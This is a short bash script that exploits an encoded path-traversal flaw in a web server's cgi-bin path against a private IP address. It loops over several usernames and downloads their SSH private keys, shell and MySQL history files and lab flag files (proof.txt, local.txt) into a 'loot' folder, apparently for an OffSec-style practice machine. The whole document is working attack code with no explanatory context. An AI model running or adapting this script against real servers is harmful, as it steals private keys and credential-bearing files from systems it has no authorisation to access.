#!/bin/bash

TARGET="192.168.240.245"
PORT="443"
OUTPUT_DIR="loot"
USERS=(offsec miranda steven mark anita)
FILES=(proof.txt local.txt .bashrc .profile .bash_history .sh_history .viminfo .mysql_history .ssh/id_rsa Downloads/note.txt Documents/notes.txt)

mkdir -p "$OUTPUT_DIR"

for user in "${USERS[@]}"; do
  echo "[*] Checking files for user: $user"
  for file in "${FILES[@]}"; do
    ENCODED_PATH="cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/home/$user/$file"
    URL="https://$TARGET:$PORT/$ENCODED_PATH"

    echo -n "  - $file: "
    HTTP_CODE=$(curl -sk -o "$OUTPUT_DIR/$user-$(basename "$file")" -w "%{http_code}" "$URL")

    if [[ "$HTTP_CODE" == "200" ]]; then
      echo "✅ Found"
      echo "$user/$file => FOUND" >> "$OUTPUT_DIR/results.txt"
    elif [[ "$HTTP_CODE" == "403" ]]; then
      echo "⛔ Forbidden"
    elif [[ "$HTTP_CODE" == "404" ]]; then
      echo "❌ Not Found"
    else
      echo "⚠️ HTTP $HTTP_CODE"
    fi
  done
done

echo -e "\n🎯 Scan complete. Check the $OUTPUT_DIR directory for results."
